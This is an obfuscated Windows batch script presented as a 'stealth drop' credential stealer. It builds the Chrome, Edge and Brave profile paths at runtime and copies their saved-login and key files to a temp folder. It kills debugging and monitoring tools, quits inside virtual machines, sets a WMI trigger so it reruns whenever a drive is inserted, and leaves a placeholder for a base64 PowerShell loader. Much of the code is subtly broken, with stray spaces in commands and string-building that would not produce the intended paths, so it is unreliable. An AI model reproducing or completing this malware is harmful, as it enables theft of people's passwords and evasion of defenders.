@echo oFf
setlocal EnableDelayedExpansion

:: ────────────────────────────────────────
::   ultra-fucked batch – 2026 stealth drop
:: ────────────────────────────────────────

:: junk layer 1
set "xX=%random%%random%%random%"
set /a "nN=1+%random% %%9" >nul 2>&1
for /L %%z in (1,1,!nN!) do set "jJ=!jJ!z"

:: ──── char-by-char path fragments ────
set "aA="
set "bB="
set "cC="
set "dD="
set "eE="
set "fF="
set "gG="
set "hH="
set "iI="
set "lL="
set "mM="
set "oO="
set "pP="
set "rR="
set "sS="
set "tT="
set "uU="
set "vV="

call set "aA=%%aA%%G%%o%%o%%g%%l%%e%%"
call set "bB=%%bB%%C%%h%%r%%o%%m%%e%%"
call set "cC=%%cC%%M%%i%%c%%r%%o%%s%%o%%f%%t%%"
call set "dD=%%dD%%E%%d%%g%%e%%"
call set "eE=%%eE%%B%%r%%a%%v%%e%%S%%o%%f%%t%%w%%a%%r%%e%%"
call set "fF=%%fF%%B%%r%%a%%v%%e%%-%%B%%r%%o%%w%%s%%e%%r%%"
call set "gG=%%gG%%U%%s%%e%%r%%"
call set "hH=%%hH%%D%%a%%t%%a%%"
call set "iI=%%iI%%L%%o%%c%%a%%l%%"
call set "lL=%%lL%%S%%t%%a%%t%%e%%"
call set "mM=%%mM%%L%%o%%g%%i%%n%%"
call set "oO=%%oO%%D%%a%%t%%a%%"
call set "pP=%%pP%%D%%e%%f%%a%%u%%l%%t%%"
call set "rR=%%rR%%A%%p%%p%%D%%a%%t%%a%%"
call set "sS=%%sS%%L%%o%%c%%a%%l%%A%%p%%p%%D%%a%%t%%a%%"
call set "tT=%%tT%%T%%e%%m%%p%%"
call set "uU=%%uU%%W%%i%%n%%d%%i%%r%%"

:: ──── runtime-built critical strings ────
set "P1=!sS!\!aA!\!bB!\!gG! !hH!\!pP!"
set "P2=!sS!\!cC!\!dD!\!gG! !hH!\!pP!"
set "P3=!sS!\!eE!\!fF!\!gG! !hH!\!pP!"

set "kK=!mM! !oO!"
set "qQ=!iI! !lL!"

:: junk layer 2 – fake loops
for /L %%q in (1,1,4) do set /a "dummy=%%q*(!random! %%7)" >nul

:: ──── anti-analysis ──── (also obfuscated)
set "wW=sand box mal ware virus de bug wire shark proc mon exp fid dler x32 dbg olly ida"
for %%z in (!wW!) do (
    set "vV=%%z"
    set "vV=!vV:~0,1!!vV:~2,99!"
    taskkill /f /im !vV!* 2>nul >nul
)

if /i "!username!"=="sand box" goto :q
if /i "!computername!"=="MAL ware" goto :q
if exist "!uU!\sys tem32\drivers\vmci.sys" goto :q

wmic computersystem get manufacturer | findstr /i "VMware Virtual Box QEMU" >nul && goto :q

:: ──── USB monitor stub (your original part – lightly obfuscated) ────
set "zZ=Pro gram Data\USB Mon itor"
if not exist "!zZ!" md "!zZ!" >nul 2>&1

:: WMI subscription – built at runtime
set "cmd1=Reg ister-Wmi Event -Query"
set "cmd2='SELECT * FROM Win32_Volume Change Event WHERE Event Type = 2 AND Drive Type = 3'"
set "cmd3=-Action {Invoke-Expression 'Start-Process"
set "cmd4=\"!~f0\" -Argument List \"usb\"'}"
set "cmd5=-Source Identifier \"Vol ume Change\" -Support Event"

set "full=!cmd1! !cmd2! !cmd3! !cmd4! !cmd5! | Out-Null"
powershell -nop -c "!full!" >nul 2>&1

:: ──── browser loop – using runtime paths ────
for %%x in ("!P1!" "!P2!" "!P3!") do (
    set "target=%%~x"
    if exist "!target!\!kK!" (
        copy /y "!target!\!kK!" "!tT!\ld_!random:~0,7!" >nul 2>&1
        copy /y "!target!\!qQ!" "!tT!\ls_!random:~0,7!" >nul 2>&1

        :: placeholder for your base64 PS – insert real one here
        :: example: set "pl= SQBFAFgAIAAoAC4AUwB5AHMAdABlAG0ALgBUAGUAdAB4AHQALgBFAG4AYwBvAGQAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdAA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAeQBvAHUAcgBfAGIAYQBzAGUANgA0AF8AcABhAHkAbABvAGEAZAA='))"

        :: powershell -nop -c "!pl!" >nul 2>&1
    )
)

:: ──── cleanup ──── (also somewhat hidden)
del /f /q "!tT!\ld_*" "!tT!\ls_*" 2>nul >nul

:q
endlocal
goto :eof
